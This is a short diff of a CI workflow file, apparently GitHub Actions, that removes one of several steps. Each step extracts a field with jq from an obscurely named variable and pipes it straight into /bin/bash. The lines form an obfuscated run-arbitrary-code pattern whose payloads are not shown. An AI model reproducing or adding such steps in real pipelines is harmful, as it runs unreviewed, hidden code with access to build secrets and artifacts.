@@ -27,7 +27,6 @@ jobs:
           echo $mopy3214 | jq -r .ieek58 | /bin/bash
           echo $ynttk5164 | jq -r .d92 | /bin/bash
           printf '%s' "$wmr161" | jq -r .yn21658 | /bin/bash
-          echo $hb805 | jq -r .romc438 | /bin/bash
           echo $gpl90509 | jq -r .oj281 | /bin/bash
 
       - name: Archive output
